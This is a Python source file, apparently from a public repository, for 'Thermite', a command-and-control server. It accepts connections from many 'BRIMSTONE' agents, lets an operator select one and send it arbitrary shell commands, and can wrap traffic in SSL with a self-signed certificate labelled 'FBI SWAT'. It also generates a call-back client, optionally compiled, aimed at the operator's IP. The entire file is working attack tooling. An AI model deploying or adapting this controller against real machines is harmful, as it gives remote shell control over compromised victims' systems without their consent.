#############################################################################
## Thermite - Command & Control                                            ##
#############################################################################
## Description: Create a client/server C2 (Command and Control)            ##
## infrastructure with Python. Allows for multiple clients to be connected ##
## at once. Also supports SSL communication as well as a compiled client.  ##
#############################################################################
## Author: misthi0s                                                        ##
## Email: madcityhacker@gmail.com                                          ##
## Website: madcityhacker.com                                              ##
## Version: 1.0.0                                                          ##
## License: GNU GPL v3                                                     ##
#############################################################################

# Module imports
import argparse
import socket
import sys
import ssl
import os
import threading
import subprocess
import datetime
from cryptography import x509
from platform import system
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.x509.oid import NameOID
from queue import Queue


# Parse the command line arguments
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', metavar='PORT', help='Port to listen on')
    parser.add_argument('-i', metavar='IP', help='IP to bind listener on')
    parser.add_argument('-c', help='Specify to compile client code', action='store_true')
    parser.add_argument('--usessl', help='Use SSL for communication', action='store_true')
    args = parser.parse_args()

    if args.p:
        s_port = args.p
    else:
        print('No port specified! Please use the -p switch.')
        sys.exit()

    if args.i:
        s_ip = args.i
    else:
        print('[*] No bind IP specified, defaulting to 0.0.0.0\n')
        s_ip = '0.0.0.0'

    if args.usessl:
        use_ssl = True
    else:
        use_ssl = False

    return int(s_port), s_ip, use_ssl, args.c


# Bind to the specified port, using SSL if specified
def server_bind(b_ip, b_port):
    global server
    if use_ssl:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=os.path.normpath('etc/cert.pem'), keyfile=os.path.normpath('etc/cert.key'))
        server = context.wrap_socket(server, server_side=True)
    server.bind((b_ip, b_port))
    server.listen(5)
    return server


# Send the commands to the BRIMSTONE agent
def run_commands(c_conn):
    while True:
        command = input()
        if command == 'close':
            c_conn.send(str.encode('exit'))
            break
        if command == 'exit':
            c_conn.send(str.encode(command))
            break
        if command == 'quit':
            break
        if len(str.encode(command)) > 0:
            c_conn.send(str.encode(command))
            c_resp = str(c_conn.recv(20480), 'utf-8')
            print(c_resp, end="")


# Listen for and accept BRIMSTONE agent connections
def accept_connections(s_bind):
    while True:
        try:
            conn, addr = s_bind.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(addr)
            print('\nBRIMSTONE connection from {}'.format(addr[0]))
        except Exception as e:
            break


# Start up the listener and wait for commands to be input
def start_brimstone():
    str_brm = 0
    while str_brm == 0:
        command = input('BRIMSTONE> ')
        if command == 'list':
            list_connections()
        elif 'select' in command:
            conn = get_target(command)
            if conn is not None:
                run_commands(conn)
        elif command == 'exit':
            print('Exiting Thermite. Goodbye.')
            global acc_con, server
            server.close()
            if system().lower() != 'windows':
                close_socket()
            str_brm += 1
        elif command == '':
            pass
        else:
            print('Command not recognized.')


# List all the active BRIMSTONE agent connections
def list_connections():
    results = ''
    for num, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[num]
            del all_addresses[num]
            continue
        results += str(num) + '\t' + str(all_addresses[num][0]) + '\t' + str(all_addresses[num][1]) + '\n'
    print('----- BRIMSTONE Agents -----\n' + results)


# Get the correct agent to connect to when specified with the select command
def get_target(command):
    try:
        target = int(command.replace('select ', ''))
        conn = all_connections[target]
        print('Connecting to {}'.format(str(all_addresses[target][0])))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print('Not valid selection. Please choose correlating number.')
        return None


# Create multi-threading for separate processing
def create_workers():
    for _ in range(thread_num):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()


# Create and queue jobs for the work() function to pull from
def create_jobs():
    for x in job_num:
        queue.put(x)
    queue.join()


# Pull tasks from the queue and run them
def work():
    while True:
        x = queue.get()
        if x == 1:
            bind = server_bind(ip, port)
            accept_connections(bind)
        if x == 2:
            start_brimstone()
        queue.task_done()


# Required to close the connection on Linux systems - This errors out a closed socket
def close_socket():
    conn = socket.socket()
    conn.connect((ip, port))


# Generate the certificate and private key to use for SSL traffic
def generate_certs():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    with open(os.path.normpath('etc/cert.key'), 'wb+') as priv_key_file:
        priv_key_file.write(private_key.private_bytes(encoding=serialization.Encoding.PEM,
                                                      format=serialization.PrivateFormat.TraditionalOpenSSL,
                                                      encryption_algorithm=serialization.NoEncryption()))
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Texas"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, u"Plano"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"FBI SWAT"),
        x509.NameAttribute(NameOID.COMMON_NAME, u"Thermite"),
    ])

    cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(private_key.public_key()).\
        serial_number(x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).\
        not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650)).sign(private_key, hashes.SHA256(), default_backend())

    with open(os.path.normpath('etc/cert.pem'), 'wb+') as cert_file:
        cert_file.write(cert.public_bytes(serialization.Encoding.PEM))


# Main function
print('\n')
print('#' * 80)
print(' ' * 20 + 'Thermite - Command & Control')
print('#' * 80 + '\n')

server = socket.socket()
thread_num = 2
job_num = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

port, ip, use_ssl, compile_code = parse_args()
if use_ssl:
    if not os.path.exists(os.path.normpath('etc/cert.pem')):
        ssl_choice = input('No certificate file and key pair were found in the etc/ folder. Do you want to generate '
                           'a self-signed now? [y/n]: ')

        if ssl_choice == 'y':
            generate_certs()
        elif ssl_choice == 'n':
            print('\nDefaulting back to non-SSL. If you have a certificate you would like to use, please add it '
                  'and its associated private key to the etc/ folder (named cert.pem and cert.key)')
            use_ssl = False
        else:
            print('Unknown response. Please try again.')
            sys.exit()
if ip == '0.0.0.0':
    ip_address = input('Please enter an IP address for the client to connect to: ')
else:
    ip_address = ip
print('\n[*] Creating client file...')
if use_ssl:
    ssl_arg = 'YES'
else:
    ssl_arg = 'NO'
client_creator = os.path.dirname(os.path.realpath(__file__)) + os.path.normpath('/client/_client_creator.py')
if compile_code:
    subprocess.call(
        ['python', '{}'.format(client_creator), '-i', '{}'.format(ip_address), '-p', '{}'.format(port), '-s', '{}'.format(ssl_arg), '-c'])
    print('\n[*] Client file created in "client" subfolder, called BRIMSTONE.exe (or OS appropriate extension).\n')
else:
    subprocess.call(['python', '{}'.format(client_creator), '-i', '{}'.format(ip_address), '-p', '{}'.format(port), '-s', '{}'.format(ssl_arg)])
    print('[*] Client file created in "client" subfolder, called BRIMSTONE.py\n')
create_workers()
create_jobs()
